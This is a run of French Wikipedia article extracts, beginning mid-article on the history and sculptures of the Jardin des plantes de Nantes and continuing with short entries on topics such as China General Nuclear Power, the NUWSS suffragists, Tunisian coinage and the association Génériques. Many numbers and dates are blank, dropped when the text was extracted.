Les travaux d'aménagement du jardin terminés, Jean-Marie Écorchard se consacre à l'enrichissement des collections et continue à prodiguer ses cours de botanique. Son œuvre sera consacrée par la présentation d'un plan en relief du jardin lors de l'Exposition universelle de 1878 à Paris. Cependant, le terrible hiver 1879-1880, avec des températures atteignant les , est fatal pour bien des plantes : 245 arbres et 600 arbrisseaux et arbustes sont gelés. Écorchard meurt en 1882 sans avoir connu l'achèvement des travaux de restauration.
1882-1900 : le Jardin des plantes après Écorchard.
La mort subite de celui qui en a été le directeur pendant plus de quarante ans marque le début d'une période sombre pour le Jardin des plantes. Le jardinier chef Rochais tente d'assurer la gestion quotidienne du jardin en cette période où la Ville connaît des difficultés financières. Il faut attendre dix ans après la mort d'Écorchard pour que l'état de dégradation du Jardin des plantes conduise diverses personnalités à demander la nomination d'un nouveau directeur. Le , Paul Marmy est officiellement embauché comme . Ses premières actions s'inscrivent dans un contexte de reprise en main après une décennie de laisser-aller. La décoration florale est revue, les plantes sont soignées, les serres sont réhabilitées et, surtout, un règlement interne visant à ramener la discipline parmi les employés et les bonnes mœurs dans le parc. Sur le plan botanique, il entreprend de réorganiser des collections selon la et reprend les contacts avec les jardins botaniques étrangers, interrompus depuis plus de vingt ans.
L'apport le plus marquant de Marmy est la réalisation du palmarium, une vaste serre chauffée destinée au développement des plantes exotiques. Cet équipement était souhaité depuis de longues années mais les prédécesseurs de Marmy n'avaient pas réussi alors à convaincre les maires de débloquer les crédits nécessaires.
Paul Marmy était également un grand passionné de roses. C'est à son initiative que le jardin se dote d'une roseraie en 1895 qui compte plus de . Au cours des années 1930, elle est remplacée par les actuelles plates-bandes botaniques.
Marmy meurt le avant d'avoir vu l'achèvement des travaux de son dernier grand projet, la réalisation de l'orangerie. Le directeur suivant n'occupe sa fonction qu'un peu plus d'un an. Entré en fonction le , Antoine-Théophile Pellerin met fin à ses jours début .
L'orangerie est achevée le et se situe derrière la palmeraie, le long de la rue Gambetta. La réalisation de cet équipement marque l'achèvement de la création du jardin.
Depuis 1900.
En 1910, le directeur Paul-Émile Citerne recense espèces cultivées. Le rôle du Jardin des Plantes prend de l'importance lorsqu'en 1920 des plantations sont effectuées en au-delà de ses murs, des équipes extérieures effectuant ces opérations sous les ordres du directeur du Jardin. Cette expansion entraîne en 1921 la nomination du directeur du Jardin des Plantes, Georges Durivault, à la tête d'une entité du tout nouveau service des plantations de la ville. Georges Larue, nommé en 1941, procède à la suppression des arbres fruitiers dans le Jardin. C'est Paul Plantiveau, nommé en 1951, qui transforme le service des plantations en service des espaces verts et de l'environnement, le SEVE. Le Jardin se transforme peu à peu. Les rosacées d'Ecorchard ont fait place à une importante collection de camélias. Le jardin est devenu plus horticole que scientifique.
En 2018-2019, dans le cadre de l'aménagement de l'esplanade Pierre-Semard, le jardin fait l'objet de travaux d'extension dans sa partie sud sur . Il intègre une partie de la rue Écorchard devenue piétonne, et notamment la petite placette triangulaire située à son extrémité ouest au niveau de laquelle a été percée une nouvelle entrée qui fut inaugurée en . Le groupe statuaire de Georges Gardet intitulée "Les Cerfs au repos" y a été placé après restauration. Parallèlement, l'entrée principale sud est modifiée, reculé d'une vingtaine de mètres, le portail de de large est remplacé deux ouvertures totalisant près de permettant ainsi l'agrandissement de la place Charles-Le Roux.
Durant l'hiver 2019-2020, l'entrée donnant face à la rue Clemenceau est rénovée : le sol est doté d'un pavage en granit blond rappelant celui qui existait naguère à cet endroit, tandis que les principales allées seront recouvertes d'un nouvel enrobé beige.
Liste des directeurs.
Les directeurs successifs sont :
Description.
Le jardin des plantes est un jardin botanique de centre ville à l'anglaise, faisant entre autres fonction d'arboretum.
On y trouve des plans d'eau, des fontaines, une cascade, des ponts, des statues, des sculptures et des pavillons. Les éléments végétaux sont représentés par des plantes vivaces, des arbustes et des arbres. L'un des plus âgés est un magnolia à grandes fleurs "(Magnolia grandiflora)", surnommé Magnolia d'Hectot. Le premier magnolia de la région, celui de la Maillardière près de Rezé, permet à M. Grolleau d'en posséder un à Nantes en 1791. Transplanté une première fois en 1796, ce magnolia est acheté par Hectot pour la somme de de l'époque et est planté dans le jardin en 1807. Son existence est attestée en 1859. Il est admis qu'il est mort ensuite et remplacé par un autre magnolia. L'hiver 1880 ayant détruit tous les jeunes arbres du jardin, le magnolia existant encore en 2010 est donc postérieur à 1880. Cet exemplaire est déjà estimé centenaire en 1986 par le service des espaces verts de la ville de Nantes. Fort de ses de diamètre, il aurait au moins 120 ans en 2010. Parmi les autres arbres et arbustes remarquables, un groupe de platanes ("Platanus acerifolia") de 140 ans, un tulipier de Virginie ("Liriodendron tulipifera") de 150 ans dont le tronc dépasse trois mètres de circonférence, un marronnier ("Aesculus hippocastanum") de 140 ans, un séquoia géant ("Sequoiadendron giganteum") de 150 ans, un séquoia à feuilles d'if ("Sequoia sempervirens") de 150 ans, un arbousier ("arbutus unedo"), un charme pyramidal ("Carpinus betulus" 'fastigiata'), un groupe de "Ginkgo biloba", un groupe de Copalmes d'Amérique ("Liquidambar styraciflua"), un metasequoia glyptostroboides, un ptérocaryer du Caucase ("Pterocarya caucasica"), un chêne des Canaries ("Quercus canariensis"), un "nyssa", un plaqueminier ("diospyros kaki") et deux pins de Wollemi ("Wollemia nobilis").
Le Jardin des plantes a quatre grandes missions : la conservation des collections et des espèces protégées dans la nature ; l'expérimentation scientifique notamment l'écophysiologie de la germination, l'étude sur l'épiphytisme dans les serres, les expérimentations sur des espèces sauvages protégées présentes à Nantes, des travaux expérimentaux sur la germination des espèces sauvages dans l'ouest de la France, la recherche et l'étude de nouvelles espèces prostrées sur le littoral ; la pédagogie au moyen de cours municipaux de botanique et de visites d'initiation à l'écologie tropicale dans les serres ; l'horticulture mise en œuvre dans les collections, la décoration florale, la mosaïculture, les soins aux plantes.
Chaque année plantes sont plantées dans la période du au pour la décoration florale d'été. Elles sont issues de cent variétés, et réparties dans cinq mosaïques florales. Elles sont arrachées entre mi-octobre et mi-novembre. La décoration florale d'automne-hiver-printemps est réalisée à partir de bulbes de plantes à fleur (giroflées, pensées, etc.). Ce sont plantes qui sont disposées pour cette période de l'année.
Le Jardin d’essai.
Il présente au public les plants utilisés chaque année pour la décoration des massifs floraux.
Sculptures et fontaines.
Le jardin des plantes recèle un certain nombre d'œuvres d'art.
"Le Premier Miroir".
Œuvre de Camille Alaphilippe, elle date de 1906. Ce groupe en grès représente une mère avec son enfant dans les bras, montrant à ce dernier, surpris et charmé, leur image reflétée par la surface calme d'un plan d'eau.
"Les Cerfs au repos".
Œuvre de Georges Gardet, il s'agit d'un groupe animalier sculpté en 1908 réunissant un cerf, une biche et un faon. Il fut attribué à la ville en 1910 par son ancien maire Gabriel Guist'hau devenu sous-secrétaire d'État aux Beaux-Arts. Durant de la Seconde guerre mondiale, les pattes des animaux furent sciées dans l'intention d'en récupérer le bronze. Seule la biche ne fut pas retrouvée. Le faon a pu être restauré par le fondeur d'art Droneau, et replacé sur son socle en 1994 d'où le surnom populaire de « Faon orphelin » donnée à l'œuvre. En 2011, il fut question de restaurer le cerf, mais le coût élevé de l'opération fit ajourner le projet. Le , à l'occasion des journées du patrimoine, la statue est présentée entièrement restaurée par la Fondation de Coubertin et quitte l'emplacement qu'elle occupait jusqu'alors près de l'enclos des animaux au sud-est du jardin pour être placée en retrait de la nouvelle entrée qui fut ouverte quelques semaines plus tard à l'angle sud-ouest de celui-ci. Le coût de la restauration d'un montant de fut entièrement financé par la ville.
"Monument à Jean-Marie Écorchard".
Un premier buste en bronze par Charles-Auguste Lebourg est inauguré en 1892. Il est fondu sous le régime de Vichy, dans le cadre de la mobilisation des métaux non ferreux. En 1981, à l'occasion du centième anniversaire de la mort du Jean-Marie Écorchard, la municipalité décide de faire réaliser une copie de l'œuvre originale par Alain Douillard.
Plaque et médaillon d'Élisa Mercœur.
Œuvre de Sébastien de Boishéraud, ce bronze fut inauguré le afin de célébrer le centenaire de la naissance de la poétesse Élisa Mercœur.
"Monument à Jules Verne".
Le buste de Jules Verne en bronze au sommet du monument, réalisé par Georges Bareau est inauguré le . Il est fondu sous le régime de Vichy, dans le cadre de la mobilisation des métaux non ferreux. Il est remplacé en 1945 par un buste en pierre, réalisé par Jean Mazuet.
"La Moissonneuse".
Œuvre de Denis Gélin, elle date de 1940.
Fontaines Wallace.
Le jardin abrite deux des cinq fontaines Wallace (œuvres de Charles-Auguste Lebourg) que possède la Ville de Nantes. L'une est située au sud-ouest, l'autre située au nord-ouest.
Œuvre disparue.
"Les Mouflons à manchettes d'Algérie".
Œuvre de Charles Valton (1851-1918), représentant deux mouflons à manchettes en bronze (un debout et un couché), elle arriva à Nantes en 1908. Une lettre du préfet en confirme l'envoi par le ministère de l'Instruction publique. La municipalité paya l'emballage et son transport. Sous le régime de Vichy, le groupe statuaire en bronze est envoyé à la fonte dans le cadre de la mobilisation des métaux non ferreux. Il ne subsiste plus de nos jours que le rocher leur servant de socle.

</doc>
<doc id="2843806" url="https://fr.wikipedia.org/wiki?curid=2843806" title="Radioactivity">
Radioactivity



</doc>
<doc id="2843807" url="https://fr.wikipedia.org/wiki?curid=2843807" title="Crise du verglas">
Crise du verglas



</doc>
<doc id="2843811" url="https://fr.wikipedia.org/wiki?curid=2843811" title="Code du statut personnel">
Code du statut personnel

Codes du statut personnel (CSP) peut désigner :

</doc>
<doc id="2843818" url="https://fr.wikipedia.org/wiki?curid=2843818" title="GR5">
GR5

GR5 ou GR.5 peut faire référence à :

</doc>
<doc id="2843824" url="https://fr.wikipedia.org/wiki?curid=2843824" title="Jardins suspendus de Sémiramis">
Jardins suspendus de Sémiramis



</doc>
<doc id="2843826" url="https://fr.wikipedia.org/wiki?curid=2843826" title="China General Nuclear Power Corporation">
China General Nuclear Power Corporation

China General Nuclear Power Corporation ou China General Nuclear Power Group (en chinois: 中国广核集团), en abrégé CGNPC ou CGNPG (anciennement "China Guangdong Nuclear Power Holding Group"), est une entreprise majeure de l'industrie nucléaire chinoise, basée à Shenzhen et placée sous l'autorité de l'agence publique chinoise SASAC.
Activités.
En , le groupe possède et exploite 11 des 20 réacteurs électrogènes civils chinois en service dont ceux de Daya Bay (Guangdong Daya Bay Nuclear Power Station - GNPS) et Ling'ao phase1 &amp; phase2 (Ling Ao Nuclear Power Station - LNPS) basés sur la technologie REP française. Le groupe a aussi 7 réacteurs en construction (sur les 28 réacteurs en construction en Chine) dont les 2 EPR à Taishan via sa filiale « Taishan Nuclear Power Joint Venture Company Limited » (TNPJVC).
CGN opère également dans d'autres secteurs comme l'énergie éolienne et l'énergie solaire ainsi que dans des industries plus traditionnelles comme l'industrie hydroélectrique, de plus son activité s'étend maintenant à toute la Chine où il est un des acteurs majeurs en ce qui concerne l'énergie nucléaire.
Historique.
China Guangdong Nuclear Power Holding Co., Ltd (CGNPC) a été créée en avec un capital social de 10,2 milliards RMB avec l'énergie nucléaire pour cœur de métier, sous l'autorité de l'agence publique chinoise SASAC. China Guangdong Nuclear Power Group (CGNPG) comprend plus de vingt filiales en propriété exclusive ou en partenariat.
Elle a été renommée en China General Nuclear Power Co fin afin de mieux refléter les ambitions du groupe dans toute la Chine et à l'export. Elle est notamment présente en Europe à travers la filiale CGN Europe Energy, qui investit entre autres dans l'énergie solaire.
En 2014, elle est partiellement introduite à la bourse de Hong Kong pour l'équivalent de 3,2 milliards de dollars.
Développement du parc nucléaire.
Les premiers réacteurs CGNPC ont été conçus et construits par Framatome.
Ensuite, CGNPC a développé le CPR-1000 basé sur le REP français mais dont une grande proportion des composants est conçue et construite en Chine.
En , CGNPC a signé un contrat avec Areva NP pour la construction de deux réacteurs nucléaires EPR situés à Taishan, dans la province du Guangdong.
Pour sa centrale nucléaire de Lufeng (Shanwei), CGNPC utilise le modèle AP1000 de Westinghouse. Ceci fait de CGNPC un des tout premiers exploitants mondiaux à construire des réacteurs de génération III+ .
En 2012, un accord secret de transfert technologique est conclu entre CGNPC et des entreprises nationales françaises.
Le Nouvel Obs publie le 27 septembre 2012 des extraits de ce projet d'accord bipartite entre EDF et son partenaire CGNPC. Le Canard enchaîné du 3 octobre 2022 publie une note de l'APE (l'Agence des participations de l'Etat), intitulée « alerte relative à un projet d'accord de coopération entre EDF et CGNPC ». Cet accord fait partie de l'affaire Maureen Kearney. Le film" La Syndicaliste", sorti le 1 mars 2023, porte ces faits à l'écran.
CGNPC et EDF ont lancé la construction de deux réacteurs nucléaires EPR situés à Hinkley Point. EDF réalise 66,5% de l'investissement et CGN 33,5%.
CGNPC et la Compagnie nucléaire nationale chinoise (CNNC) développent le Hualong-1, aussi connu sous la dénomination HPR-1000, qui est un projet chinois de réacteur nucléaire à eau pressurisée. 
Ce réacteur est basé sur les conceptions des ACPR-1000 et ACP-1000 (autres réacteurs nucléaires chinois).
Accusation d’espionnage.
Accusée sans preuves d'espionnage industriel par les États-Unis en 2016, la CGNPC est placée le sur la liste noire qui interdit aux entreprises listées tout accès aux technologies américaines et toute activité commerciale avec les entreprises américaines.

</doc>
<doc id="2843828" url="https://fr.wikipedia.org/wiki?curid=2843828" title="Jean-Claude Ligeron">
Jean-Claude Ligeron

Jean-Claude Ligeron ( - ) a été un acteur majeur du développement de la sûreté de fonctionnement (SdF) en France, notamment dans le domaine de la fiabilité mécanique. Il est considéré comme un pionnier pour avoir intégré la sûreté de fonctionnement à l'analyse du risque, et en raison de son approche transdisciplinaire, qui lui a permis de développer de nombreuses méthodes et outils adaptés d'autres domaines. Ses ouvrages restent une référence. 
Biographie.
Après des débuts à la société Matra où il développe les techniques de fiabilité en mécanique, l'analyse système, l'analyse des données, il rejoint la SGTE dont il devient directeur de la division fiabilité. Il y forme de nombreux ingénieurs SdF qui essaimeront ensuite dans l'industrie française et dans les sociétés de conseil du domaine. Il a été l'origine de la création des sociétés de conseil Sector en 1990, puis Ligeron SA en 1995, qui sont devenues des références dans le domaine de la sûreté de fonctionnement. En 2005, il cède sa société au groupe Sonovision-Itep dont elle devient une division.
Il a aussi contribué à la mise en place de formations aux métiers de la sûreté de fonctionnement tels que :
Il était membre fondateur de l'IMdR (Institut pour la maîtrise des risques), pour lequel il a eu, à deux reprises, l'honneur de présider le comité technique du congrès Lambda/Mu.
Dans "Anticipation, innovation, perception : Des défis pour la maîtrise des risques à l'horizon 2020", Emmanuel Arbaretier écrit que Jean-Claude Ligeron .
Publications.
Il est l'auteur d'une dizaine d'ouvrages dans les domaines de la sûreté de fonctionnement et des statistiques, de la maîtrise des risques et de la fiabilité en mécanique.
Il a été le rédacteur en chef de la revue de la sûreté de fonctionnement "Phoebus", créée à son initiative en 1997. Cette revue trimestrielle a cessé de paraître en 2005 et compte une collection de 35 numéros.

</doc>
<doc id="2843835" url="https://fr.wikipedia.org/wiki?curid=2843835" title="Kevin Porter (basket-ball)">
Kevin Porter (basket-ball)

Kevin Porter (né le , à Chicago, Illinois) est un joueur américain professionnel de basket-ball.
Meneur de jeu d'1,85 m issu de l', Porter dispute 10 saisons (1972 à 1981 et 1982 à 1983) en National Basketball Association sous les couleurs des Bullets de Baltimore/Capital/Washington, des Pistons de Détroit et des Nets du New Jersey. Porter est l'un des passeurs les plus talentueux de l'histoire de la ligue, étant meilleur passeur décisif de la NBA à quatre reprises durant sa carrière (1975, 1978, 1979 et 1981). Il détint le record de passes décisives en un match avec 29 jusqu'à ce que Scott Skiles le dépasse avec 30 passes décisives le 30 décembre 1990. 
Porter est membre de l'équipe des Bullets qui atteint les Finales NBA 1975. Ils s'inclinent face aux Warriors de Golden State. Quand il prend sa retraite en 1983, il cumule un total de 5314 passes décisives et 7645 points en carrière.
Après avoir quitté la NBA, Porter intègre la "Toyota Super Corollas Basketball Team" de la Philippine Basketball Association.

</doc>
<doc id="2843836" url="https://fr.wikipedia.org/wiki?curid=2843836" title="Bhola">
Bhola

Bhola est la plus grande île du Bangladesh, avec une superficie de . Elle se trouve à l'embouchure du fleuve Meghna.
En 1975, Bhola fut le site d'un des derniers cas de variole connus.
En 2005, la moitié de l'île fut engloutie par les eaux, occasionnant sans-abris. Les habitants de Bhola ont été décrits comme faisant partie des premiers réfugiés climatiques dans le monde.

</doc>
<doc id="2843838" url="https://fr.wikipedia.org/wiki?curid=2843838" title="Jean-Claude LIGERON">
Jean-Claude LIGERON



</doc>
<doc id="2843839" url="https://fr.wikipedia.org/wiki?curid=2843839" title="Fels (monnaie tunisienne)">
Fels (monnaie tunisienne)

Le fels () est une ancienne subdivision monétaire de la Tunisie.
Étymologie.
Le pluriel de "fels" est "flous" (appelée « bourbine » par les Européens), mot utilisé jusqu'à nos jours pour désigner dans le dialecte tunisien la monnaie ou l'argent en général. De "flous" découle le mot « flouze » qui, en argot français, désigne l'argent en général. 
"Flouss" ou "flousse" serait un vieux mot du grec ancien ("phollis") qui a donné "follis" en latin, mot qui dans ces deux langues signifie « bourse ».
Par ailleurs, "fales" () et "fless" () désignent en tunisien quelqu'un de démuni et "falsa" () est synonyme de faillite.
Évolution et équivalence.
C'est la pièce de monnaie tunisienne la plus petite par sa dimension et la plus basse par sa valeur. Utilisée en Tunisie à différentes périodes, les Tunisiens la nommaient communément "fels reqyq" (), c'est-à-dire « menue monnaie ». Les Européens qui font commerce avec Tunis donnent à cette monnaie le nom de « bourbine ». Il en faut vingt-quatre pour obtenir un nasry (aspre), par conséquent 1248 pour obtenir un rial tunisien (piastre).
Cette pièce de monnaie est presque toujours fruste et irrégulièrement taillée et ressemble souvent à des fragments informes coupés grossièrement dans une lame de cuivre. Elle est retirée de la circulation vers la fin du . Ces fels (bourbines), qui avaient cours dans le commerce de détail, ont donc peu à peu disparu, leur valeur étant devenue dérisoire.
Cependant, durant une certaine période, on tient encore compte des fels (bourbines) dans les opérations de change et dans les comptes qui se tiennent en rials, kharoubas, nasrys et fels, selon les rapports suivants :

</doc>
<doc id="2843840" url="https://fr.wikipedia.org/wiki?curid=2843840" title="LIGERON">
LIGERON



</doc>
<doc id="2843843" url="https://fr.wikipedia.org/wiki?curid=2843843" title="Une virée d'enfer">
Une virée d'enfer

Une virée d'enfer ("") est un film américain du cinéma indépendant de 1996 réalisé par Rich Wilkes.
Synopsis.
À deux jours de la fin de ses quatre années d'étude à l'université, Jack devrait sauter de joie, sabrer le champagne à longueur de journées. Mais il est triste, il déprime à l'idée de se séparer de sa bande de copines et copains. À chacun sa vie désormais. Plus que tous les autres, Jack ne s'y résigne pas. Alors, comme pour conjurer le sort, il joue les prolongations en compagnie de ses meilleurs amis sur le départ. 

</doc>
<doc id="2843844" url="https://fr.wikipedia.org/wiki?curid=2843844" title="Sylans">
Sylans



</doc>
<doc id="2843846" url="https://fr.wikipedia.org/wiki?curid=2843846" title="National Union of Women's Suffrage Societies">
National Union of Women's Suffrage Societies

La National Union of Women's Suffrage Societies (NUWSS), également connue sous le nom de Suffragists pour se distinguer des "Suffragettes", est une organisation qui milite en faveur du droit de vote des femmes à la fin du et au début du au Royaume-Uni.
Création et militantisme.
Le groupement d'associations fut fondé en 1897 à la suite de la réunion de la "National Central Society for Women's Suffrage" (NCWS) et du comité central de la "National Society for Women's Suffrage" (NSWS), les deux associations s'étant précédemment séparées en 1888.
La NUWSS était dirigée par Millicent Fawcett, qui fut la présidente de la National Society for Women's Suffrage pendant plus de vingt ans. Elle consistait en une organisation démocratique qui avait pour but l'établissement du droit de vote pour les femmes par des moyens pacifiques et légaux, c'est-à-dire par l'introduction de projets de loi au Parlement et la tenue de meetings de sensibilisation à leur cause.
En 1903, la NUWSS connaît une scission, avec la création de la Women's Social and Political Union (WSPU), les « suffragettes »), qui avait des méthodes plus radicales. Pourtant, l'union continua à se développer et jusqu'à compter, en 1914, répartis dans tout le pays réunissant en tout plus de . La majeure partie de ses membres étaient issues de la classe moyenne mais elle comptait dans ses rangs des membres d'origine plus modeste et, contrairement à la WSPU, elle acceptait l'adhésion de membres masculins.
Lors des élections législatives de 1906, la NUWSS forme des comités dans chacune des circonscriptions pour convaincre les partis locaux de sélectionner les candidats acquis à sa cause.
L'année suivante, le , elle organisa la "Mud March", sa première manifestation de grande ampleur.
En 1912, Millicent Fawcett se rapproche du Parti travailliste en vue des prochaines élections. Sa décision rompt avec la position originelle d'indépendance vis-à-vis des partis et provoque les critiques de suffragistes libérales, comme Eleanor Rathbone, qui quitte l'association. Elle y reviendra pourtant et en devint la présidente en 1918.
La NUWSS est affiliée à l'Alliance internationale pour le suffrage des femmes.
Première Guerre mondiale.
Lorsque la Première Guerre mondiale éclata, la majorité de ses membres est en faveur de la guerre, tandis qu'une minorité prône des idées pacifistes. L'organisation participe à l'effort de guerre, en soutenant le remplacement dans l'industrie des hommes partis au front par des femmes. Elle crée également des unités de soins composées uniquement d'infirmières et de femmes médecins, qui apportèrent leur aide sur le front français.
À la fin de la guerre, en 1918, le Parlement accorde le droit de vote aux femmes âgées de plus de 30 ans, ce qui ne correspond pas encore à l'égalité des droits entre les hommes et les femmes demandé par l'Union. Des députées sont cependant pour la première fois élues. Les conditions de vote et d'éligibilité seront alignées sur celles des hommes en 1928.

</doc>
<doc id="2843851" url="https://fr.wikipedia.org/wiki?curid=2843851" title="Nasry">
Nasry

Le nasry ou nâsrî () est une ancienne subdivision monétaire de la Tunisie d'avant la réforme monétaire de 1891.
Alors que les Européens la nomment « aspre » ou, selon Paul Sebag, « blanquile », les Tunisiens la désignent par le nom de "nasry". Elle vaut douze qafsi (ou bourbines) et deux fels (ou bourbes). Il en faut 52 pour obtenir un rial tunisien.
La pièce figurant ci-contre porte sur l'avers, dans un cercle ponctué, le nom du sultan ottoman Moustafa III. Sur le revers, on peut lire "douriba fi tounis" (« frappé à Tunis ») avec la date de l'année post-Hégire (équivalent à 1761).
Les rapports étaient les suivants :
Étymologie.
Le mot "nasry" vient de Muhammad an-Nasir, quatrième calife almohade régnant entre 1199 et 1213. Quant à « aspre », il provient du grec vulgaire ' ("aspros") qui signifie « blanc », les Ottomans l'appelant akçe, du turc, ', « blanc », de la couleur de l'argent métal donc.

</doc>
<doc id="2843855" url="https://fr.wikipedia.org/wiki?curid=2843855" title="Génériques">
Génériques

Génériques est, en France, une association qui a pour but la sauvegarde et la mémoire de l'histoire de l'immigration. Elle est active de 1987 à 2018. Ses domaines d'intervention sont : la préservation et la valorisation des fonds d'archives privées et publics de l'histoire de l'immigration, la mise à disposition pour les chercheurs et le public de ressources sur l'histoire de l'immigration, le développement et la promotion d'événements culturels liés à l'immigration (expositions, colloques, etc.) et l'écriture et la publication d'ouvrages de référence sur l'histoire de l'immigration en France et en Europe. En cela, Génériques a largement contribué à la reconnaissance morale et politique des immigré⋅es et de leurs descendant⋅es en France.
Historique.
L'association Génériques a été créée en 1987 avec pour objectif "« d’entreprendre et de soutenir toute action permettant d’améliorer la connaissance des phénomènes migratoires en France et dans le monde, par des activités tant scientifiques que culturelles »".
Elle voit le jour dans un contexte, marqué par La Marche pour l'Égalité et contre le Racisme de 1983, où les travailleurs immigrés luttent de plus en plus pour leurs droits, contre les violences d'État et pour l'auto-détermination du peuple palestinien. Les fondateurs de l'association (parmi lesquels Driss El Yazami et Saïd Bouziri) ont aussi contribué à la création de deux journaux centrés sur la vie et la situation de l’immigration maghrébine en France, "Sans Frontière" et "Baraka""."
Dans le cadre qu'elle s'est fixée, l’association a entrepris un important travail de sauvegarde, de préservation et d’inventaire des archives privées de l’immigration en France. Il vise à préserver le patrimoine que constituent les archives de l’immigration et à le valoriser de manière à montrer l’apport des étrangers à l’histoire culturelle, politique, économique et sociale du pays. Avec des objectifs clairement définies, Génériques voulaient rompre avec les codes militants tout en œuvrant dans le sens de la reconnaissance politique des immigré⋅es. Ainsi que l'écrit "La structure devait donc répondre à trois exigences impératives : d’abord, la mise en place d’une équipe professionnalisée permanente ; ensuite, une rigueur scientifique incontestable, obtenue grâce à l’appel à des chercheurs et au travail en partenariat avec différents laboratoires de recherche, des centres universitaires et les Archives de France ; enfin, maintenir une grande qualité visuelle et graphique dans tous les travaux, publications, expositions ou productions de l’association, qui portent sur les thématiques de l’histoire de l’immigration."
L'association Génériques a réalisé en 1989 la première grande exposition consacrée à l'histoire de l'immigration en France. Inaugurée dans le cadre du bicentenaire de la Révolution française, l'exposition "France des étrangers-France des libertés" restitue deux siècles de cette histoire à travers les journaux publiés par les communautés immigrées en France et reçoit l'accueil enthousiaste d'un grand public et de la presse.
Encouragée par ce succès, Génériques s'est constituée comme organisme de recherche et de création culturelle sur l'histoire et la mémoire de l'immigration en France aux XIX et XX siècles. Sensible à la valorisation du patrimoine de l'immigration, Génériques a engagé en 1992, en partenariat avec la Direction des Archives de France, l'Inventaire national des sources d'archives sur les étrangers.
Domaines de recherche et productions.
Depuis plus de dix ans Génériques s'attache ainsi à inventorier les archives publiques territoriales et nationales, et les sources iconographiques et audiovisuelles sur les étrangers en France. Elle a publié, en coédition avec la Direction des Archives de France, "Les étrangers en France - Guide des sources d'archives publiques et privées - " en 4 tomes, préfacé par Martine Aubry, ministre de l'Emploi et de la Solidarité, et Catherine Trautmann, ministre de la Culture et de la Communication. Pierre-Dominique Cheynet et Michel Dreyfus ont notamment collaboré à la réalisation de cet ouvrage. Un cinquième tome est en cours de préparation.
Génériques œuvre également pour la sauvegarde des archives privées de l'immigration -archives provenant d'associations communautaires ou de solidarité, d'organismes d'accueil et d'hébergement, de syndicats, de militants... - et pour leur mise à disposition auprès de tous publics.
L'association a également organisé un colloque à Marseille (9-) intitulé "Les footballeurs maghrébins en France au ". L'événement a rencontré un franc-succès et a eu un écho dans les pages de France Football, El Watan, La Provence, Al Jazeera Sport, L'Équipe et France Culture. Parmi les invités et participants à ces rencontres figuraient notamment les anciennes stars du football Rachid Mekhloufi, Mustapha Zitouni, Alim Ben Mabrouk, Mustapha Dahleb, Kader Ferhaoui, Nordine Kourichi, Chérif Oudjani...
Institutions partenaires.
Génériques est devenue un organisme de référence, en France mais aussi en Europe, sur le patrimoine archivistique et historique de l'immigration. À ce titre, elle a organisé plusieurs séminaires ou colloques, avec des partenaires français et internationaux. Génériques est membre du réseau Association of European Migrations Institutions (AEMI), ainsi que des instances de la Cité nationale de l'histoire de l'immigration (CNHI). Génériques est aussi à l'origine de la biennale sur les migrations maghrébines, en partenariat avec plusieurs équipes de recherche du Maghreb.
L'association travaille également en étroite collaboration avec La contemporaine, l'Acsé (anciennement "Fonds d'aide et de soutien pour l'intégration et la lutte contre les discriminations", FASILD), financé par le Ministère de la culture et de la communication. Génériques est également membre du Collectif des centres de documentation en histoire ouvrière et sociale (CODHOS).
Éditions Mémoires-Génériques.
Génériques est également un éditeur. Les éditions Mémoire-Génériques publient ou s'associent à de nombreuses publications d'ouvrages scientifiques ou à destination du grand public sur l'histoire de l'immigration. Les éditions Mémoire-Génériques publient en particulier la revue "Migrance", première revue européenne spécialisée dans l'histoire de l'immigration. Cette publication connaît une diffusion internationale. De nombreux spécialistes ont collaboré à cette revue, dont Benjamin Stora, , Alec Hargreaves, Yvan Gastaut, André Costes...
Génériques participe aussi régulièrement à la préparation de documentaires, d'émissions radiophoniques et de manifestations culturelles sur la présence des étrangers en France, notamment par des recherches d'iconographies inédites ou par des conseils dans le repérage de documents d'archives encore peu exploités.
Centre de ressources.
L'association dispose d'un centre de ressources en relation avec l'histoire de l'immigration. Ce centre met à disposition les fonds d'archives conservés dans ses locaux, sa collection de plus de 4000 affiches et journaux, ainsi que sa bibliothèque comprenant plus de 1200 ouvrages. Génériques dispose également d'une base de données, consultable en ligne via son site. Celle-ci est composée d'une base de ressources sur les affiches de l'immigration (collectées depuis 1970), des archives publiques et privées de France (depuis 1800), de journaux (depuis 1800) et de photographies (depuis 1990). Un dictionnaire biographique, constitué de notices sur des personnalités marquantes depuis le milieu du .
Fin et bilan de l'association.
En 2018, la réduction voire la disparition de nombreuses subventions a conduit à la dissolution de l'association après un peu plus de trente ans d'activité. Le bilan tiré par le dernier secrétaire général de l'association est le suivant : "Des dizaines de milliers de sources d'archives ont été identifiées dans les centres de conservation du patrimoine, des centaines de fonds privés ont pu être sauvegardés et rendus publics. Ces ressources ont permis d'essaimer, de nourrir des centaines de projets et de progresser dans une meilleure connaissance de l'histoire de l'immigration." En outre, la sortie de documentaires télévisés sur l'histoire de l'immigration et ses apports et la création du Musée national de l'histoire de l'immigration témoignent du progrès fait dans la prise en compte de l'immigration dans la mémoire nationale.

</doc>
<doc id="2843857" url="https://fr.wikipedia.org/wiki?curid=2843857" title="Heiligenhafen">
Heiligenhafen

Heiligenhafen est une ville allemande située dans l'arrondissement du Holstein-de-l'Est ("Landkreis Ostholstein"), dans le "Land" de Schleswig-Holstein. Elle compte environ .
Géographie.
La ville se trouve sur la côte nord de la presqu'île de Wagrie, au bord de la mer Baltique. Elle fait face à l'île de Fehmarn.

</doc>
<doc id="2843861" url="https://fr.wikipedia.org/wiki?curid=2843861" title="Xizang">
Xizang



</doc>
<doc id="2843863" url="https://fr.wikipedia.org/wiki?curid=2843863" title="Transition dreams">
Transition dreams



</doc>
<doc id="2843869" url="https://fr.wikipedia.org/wiki?curid=2843869" title="Église Notre-Dame-du-Rosaire de Doha">
Église Notre-Dame-du-Rosaire de Doha

L'église Notre-Dame-du-Rosaire, située à Doha, au Qatar, est la première église catholique ouverte sur une terre musulmane wahhabite. Le lieu de culte a ouvert ses portes le vendredi .
Le Qatar, où se pratique, comme en Arabie saoudite, un islam rigoriste, se refusait jusqu'alors à ouvrir un lieu de culte catholique, notamment destiné aux milliers de travailleurs immigrés proche-orientaux ou asiatiques de confession catholique. Elle ne porte cependant à l'extérieur ni symbole religieux, ni clocher.
L'église peut accueillir . 

</doc>
<doc id="2843872" url="https://fr.wikipedia.org/wiki?curid=2843872" title="Boris Galerkine">
Boris Galerkine

